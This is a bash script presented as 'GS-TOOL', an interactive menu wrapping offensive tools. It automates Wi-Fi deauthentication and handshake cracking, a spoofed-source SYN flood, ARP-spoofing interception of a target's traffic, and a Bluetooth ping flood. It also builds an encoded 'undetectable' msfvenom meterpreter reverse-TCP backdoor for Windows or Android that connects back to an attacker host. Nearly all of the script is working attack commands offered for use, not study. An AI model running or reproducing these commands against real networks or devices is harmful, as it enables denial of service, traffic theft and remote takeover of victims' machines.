#!/bin/bash 
clear



echo
echo -e "\e[1;34m   ____ ____      _____ ___   ___  _      "
echo -e "\e[1;34m  / ___/ ___|    |_   _/ _ \ / _ \| |     "
echo -e "\e[1;37m | |  _\___ \ _____| || | | | | | | |     "
echo -e "\e[1;31m | |_| |___) |_____| || |_| | |_| | |___  "
echo -e "\e[1;31m  \____|____/      |_| \___/ \___/|_____| "
echo    
echo   by get-sum
echo  ------------
echo                insta _.get_sum._
echo                ------------------
echo
echo ENTER
echo
read -p 'gs-tool : ' choix1

clear








while [ test ]
do

echo    -e "\e[1;01m "
echo    -e "\e[1;31m           ----------- "
echo      -e "\e[1;34m             GS-TOOL "
echo    -e "\e[1;31m           -----------"
echo -e " \e[1;34m        by get-sum"
echo -e " \e[1;31m      -------------"
echo 
echo -e ' \e[1;31m '
echo 
read -p 'gs-tool : ' choix




if [ $choix = "monitor" ]

then
echo -e "\e[1;35m        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo
echo -e "\e[1;31m           monitor mode    for tp-link TL-WN722N , alpha network ect "
echo -e "\e[1;35m        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo              
echo -e "$\e[1;33m   by get-sum"
echo " ------------"
sudo ifconfig wlan0 down
echo [OK] Wlan0 down
airmon-ng check kill
echo [OK] check kill
iwconfig wlan0 mode monitor
echo [OK] wlan0 mode monitor
iwconfig wlan0
clear 
 
read -p 'interface : ' interface 

airodump-ng $interface
fi



if [ $choix = "help" ]
then
echo -e "\e[1;01m "
echo -e "\e[1;32m "
echo    '         -------------------------------------------------------------------------  '
echo    '         [$] clear : clear                  | [$] ifconfig : ifconfig            |  '
echo -e '\e[1;31m         -------------------------------------------------------------------------  '
echo    "         [!] don't need monitor mode  |     | [!] need monitor mode  |           |  "
echo -e '\e[1;33m         -----------------------------v------------------------------v------------  '
echo    '         [+] sniffing : sniff               | [+] monitor mode : monitor         |  '
echo    '         -------------------------------------------------------------------------  '
echo    '         [+] network scan : nc              | [+] crack wifi : crack             |  '
echo    '         -------------------------------------------------------------------------  '
echo    '         [+] ports scan : pscan (nmap)      | [+] Deauthentication Attack : da   |  '
echo    '         -------------------------------------------------------------------------  '
echo    '         [+] denial of service : dos        | [+] backdoor undetectable : bacd   |  '
echo    '         -------------------------------------------------------------------------  '
echo    '         [+] update                         | [+] bluetooth DOS : bdos           |  '
echo    '         -------------------------------------------------------------------------  '
echo    '         [+] install dependances : ind      | [+] captif portal attack (soon)    |  '
echo    '         -------------------------------------------------------------------------  '
fi



if [ $choix = "clear" ]
then
clear
fi


if [ $choix = "ifconfig" ]
then
echo
echo
ifconfig
echo
echo
fi

if [ $choix = "iwconfig" ]
then
echo
echo
iwconfig
echo
echo
fi

if [ $choix = "exit" ]
then 
exit
fi

if [ $choix = "nc" ]
then


clear
echo -e "\e[1;31m       "
echo   "-----------------"
echo   "   NeTwoRk ScAn  "
echo   "-----------------"
echo
echo
netdiscover
fi




if [ $choix = "pscan" ]
then 
clear
echo
echo -e "\e[1;33m "
echo   ------------------------
echo      - ports scaner -
echo   ------------------------
echo 
echo
echo
echo -e ' \e[1;31m '
echo
read -p ' machine ip : ' ipm 
echo
echo
ping -c 2 $ipm
nmap -sS -sV -Pn -v $ipm
fi



if [ $choix = "crack" ]
then
clear
echo
echo
echo -e ' \e[1;33m '
echo -----------------------
echo -  retrival handshak  - 
echo -----------------------
echo
echo -e ' \e[1;31m '
echo 'interface ex : wlan0, wlan0mon'
echo
echo
echo -e ' \e[1;31m '
read -p 'interface : ' winterface
echo -e ' \e[1;37m '
n_secondes=7
(airodump-ng $winterface >> lewifi1.txt) &
sleep 7
kill $!
cat lewifi1.txt
rm -r -f lewifi1.txt
echo
echo
echo -e '\e[1;33m '
echo choose acces point
echo
echo
echo -e ' \e[1;31m '
read -p 'bssid: ' apbssid
echo -e ' \e[1;37m '
echo
echo
echo -e ' \e[1;31m '
read -p 'chanel : ' apch
echo -e ' \e[1;37m '
echo
echo
echo
echo  'name of file of capture   ex : filecap'
echo
echo
echo -e ' \e[1;31m '
read -p 'file : ' filecap1
echo -e ' \e[1;37m '
echo
echo
echo
echo
n_secondes=7
(airodump-ng -c $apch --bssid $apbssid $winterface >> lewifi1.txt) &
sleep 7
kill $!
echo [ok]
rm -r -f lewifi1.txt
echo
echo
airodump-ng -c $apch --bssid $apbssid -w $filecap1 $winterface | aireplay-ng -0 9 -a $apbssid $winterface
echo
echo
echo
echo
echo -e  '\e[1;33m '
echo ------------------
echo   crack handshake
echo  - aircrack-ng -
echo ------------------
echo
echo
echo
echo
echo -e  '\e[1;35m '
echo wep   or wpa
echo
echo
echo
echo -e  '\e[1;31m '
read -p 'sercurity : ' ecript
echo -e  '\e[1;33m '
echo
echo
crunch 8 25 azertyuioqsdfghjklmwxcvbn01234567890 | aircrack-ng -w - -b $apbssid -a $ecript $filecap1-01.cap
echo
echo
clear
fi




if [ $choix = "dos" ]
then
clear
echo
echo
echo -e  '\e[1;33m '
echo   -----------------------
echo   -  DeNiAl-Of-SeRvIcE  -
echo   -----------------------
echo    -  ip of the target - 
echo    ---------------------
echo
echo
echo
echo  
echo
echo -e  '\e[1;31m '
read -p 'ip : ' ipdos
echo
echo
echo
echo
echo
hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $ipdos
fi









if [ $choix = "ls" ]
then
ls
fi


if [ $choix = "shell" ]
then
exit
fi




if [ $choix = "ind" ]
then 
clear
apt-get update
apt-get install xterm
echo -e  '\e[1;32m '
echo [OK] XTERM
echo -e  '\e[1;30m '
apt-get install hping3
echo -e  '\e[1;32m '
echo [OK] hping3
apt-get install aircrack-ng
apt install aircrack-ng
apt install nmap
apt-get install driftnet
apt install driftnet
apt-get install urlsnarf
apt install driftnet
apt-get install netdiscover
apt install msfvenom
apt install l2ping
echo -e  '\e[1;35m '
apt-get install l2ping
apt install apache2
echo apache2 [ok]
apt install hcitool
apt install arpspoof
apt-get install arpspoof
clear
echo '[end]'
fi



if [ $choix = "sniff" ]
then
clear
echo 
echo -e  '\e[1;31m '
echo -----------------------
echo    - sniffing mitm -
echo -----------------------
echo
echo -e  '\e[1;35m '
echo  Interface
echo
echo -e  '\e[1;31m '
read -p 'interface : ' interfacesn
echo -e  '\e[1;37m '
n_secondes=10
(netdiscover >> lewifisniff.txt) &
sleep 10
kill $!
cat lewifisniff.txt
rm -r -f lewifisniff.txt
echo
echo
echo
echo -e  '\e[1;33m '
echo  IP OF TARGET
echo
echo
echo
echo -e  '\e[1;31m '
read -p 'ip : ' ipsn
echo -e  '\e[1;33m '
echo
echo
echo
echo -e  '\e[1;33m '
echo  FILE OF CAPTURE
echo
echo
echo
echo -e  '\e[1;31m '
read -p 'file : ' sniffcap
echo -e  '\e[1;37m '
echo
echo
echo
echo -e  '\e[1;33m '
echo IP OF ROUTEUR
echo
echo
echo
echo -e  '\e[1;31m '
read -p 'ip : ' routeursn
echo -e  '\e[1;37m '
echo
echo
echo
sysctl net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $interfacesn -o eth1 -j ACCEPT
mkdir capture-sniffing
arpspoof -i interfacesn -t $routeursn $ipsn | driftnet -i $interfacesn $ipsn >> capture-sniffing/$sniffcap.cap | urlsnarf -i $interfacesn $ipsn >> capture-sniffing/$sniffcap.cap
fi









if [ $choix = "msf" ]
then
xterm -e msfconsole
fi


if [ $choix = "shark" ]
then
wireshark
fi






if [ $choix = "da" ]
then
echo -e  '\e[1;33m '
clear
echo
echo       --------------------------
echo         Deauthentication Attack
echo         - need monitor monde -
echo       --------------------------
echo
echo   -   INTERFACE : wlan0, wlan0mon    -  
echo   ------------------------------------
echo   
echo
echo
echo
echo -e  '\e[1;31m '
read -p 'interface : ' interfaceda
n_secondes=7
(airodump-ng $interfaceda >> lewifi.txt) &
sleep 7
kill $!
cat lewifi.txt
rm -r -f lewifi.txt
echo -e  '\e[1;33m '
echo
echo  -------------------------
echo   Deauthentication Attack
echo   - need monitor monde -
echo  -------------------------
echo
echo
echo -e  '\e[1;31m '
echo  acces point bssid
echo
echo
echo
echo -e  '\e[1;31m '
read -p  'bssid : ' bssidda
echo -e  '\e[1;37m '
echo
echo
echo
echo
echo   channel of acces point
echo
echo
echo
echo -e  '\e[1;31m '
read -p 'channel : ' chanelda
echo -e  '\e[1;37m '
echo
echo
n_secondes=9
(airodump-ng --bssid $bssidda -c $chanelda $interfaceda >> lewifi1234.txt) & 
sleep 9
kill $!
clear
echo -e  '\e[1;32m '
echo attack started ... 
aireplay-ng -0 122222 -a $bssidda $interfaceda 
rm -r -f lewifi1234.txt
fi




if [ $choix = "bacd" ]
then
clear
echo  -----------------------
echo    backdoor reverse tcp
echo  -----------------------
echo os ex: windows , android
read -p ' os :' osbd
echo
echo  HOST
echo
read -p 'host : ' hostbd
echo
echo PORT
echo
read -p 'port : ' portbd
echo files name
read -p 'name : ' namebd

if [ $osbd = "windows" ] 
then
msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd -a x86 --encoder cmd/powershell_base64 -i 58 lport=$portbd > $namebd.exe
fi

if [ $osbd = "android" ]
then
msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd lport=$portbd > $namebd.apk
fi


fi





if [ $choix = "bdos" ]
then
echo
echo
echo
echo
echo
echo  ' -------------------------- '
echo  ' -    bluetooth attack    - '
echo  ' -------------------------- '
echo
echo
hcitool scan
echo
echo
echo
read -p 'mac address : ' macbdos
l2ping -s 10000 $macbdos
fi




if [ $choix = "update" ]
then
cd ..
rm -r -f gs-tool
git clone https://github.com/GET-SUM/gs-tool
cd gs-tool
chmod 777 *
./gs-tool
echo
echo [updated programme]
fi



done
